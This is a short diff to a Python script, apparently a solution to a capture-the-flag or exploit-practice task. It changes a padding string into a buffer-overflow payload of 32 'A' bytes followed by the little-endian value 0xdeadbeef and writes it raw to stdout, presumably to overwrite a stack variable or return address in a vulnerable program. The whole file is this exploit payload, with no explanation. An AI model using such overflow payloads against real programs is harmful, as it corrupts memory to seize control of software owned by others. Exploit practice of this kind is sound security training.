@@ -1,4 +1,5 @@
+import sys
 
-
-payload = "A" * 24 + "J"
-print(str(payload))
+payload = b"A" * 32 + b"\xef\xbe\xad\xde"
+#print(str(payload))
+sys.stdout.buffer.write(payload)
